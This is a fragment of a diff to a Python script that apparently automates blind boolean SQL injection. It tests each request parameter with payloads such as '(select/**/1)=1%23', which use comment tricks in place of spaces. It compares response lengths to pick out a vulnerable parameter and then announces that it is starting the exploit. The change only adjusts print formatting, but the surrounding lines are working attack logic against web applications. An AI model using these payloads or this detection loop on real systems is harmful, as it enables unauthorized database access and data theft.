@@ -45,12 +45,12 @@ def main():
     # checking all params from data
     for param in data:
         for point in injection_points:
-            print('Checking parametr {} with injection {}'.format(param, point))
+            print('Checking parametr "{}" with injection "{}"'.format(param, point))
             # making assumption that True and False answers has different Content-Length header and True>False
             true_len=response_length(data, param, "{}(select/**/1)=1%23".format(point))
             false_len=response_length(data, param, "{}(select/**/0)=1%23".format(point))
             if true_len>false_len:
-                print('(+) Parametrs {} is vulnerable to injection {}. Starting the exploit'.format(param, point))
+                print('(+) Parametr "{}" is vulnerable to injection "{}". Starting the exploit'.format(param, point))
                 vulnerable_param = param
                 vulnerable_point = point
                 break
